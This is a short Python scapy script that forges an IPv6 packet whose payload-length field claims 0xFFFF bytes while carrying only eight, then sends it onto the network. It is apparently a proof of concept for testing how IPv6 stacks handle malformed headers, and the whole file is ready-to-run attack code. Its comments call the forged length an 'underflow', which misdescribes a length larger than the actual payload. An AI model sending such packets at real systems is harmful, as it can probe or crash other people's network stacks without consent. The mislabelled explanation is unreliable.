from scapy.all import *

def create_ipv6_underflow_packet():
    # Construct the IPv6 packet
    ip6_packet = IPv6(src="2001:db8::1", dst="2001:db8::2")
    
    # Craft an invalid payload length (underflow)
    ip6_packet.plen = 0xFFFF  

    # Construct the payload
    payload = b"A" * 8  # An example small payload

    # Combine the IP header and payload
    packet = ip6_packet / payload

    return packet

def send_packet(packet):
    send(packet)

if __name__ == "__main__":
    packet = create_ipv6_underflow_packet()
    print(f"Sending packet: {packet.summary()}")
    send_packet(packet)
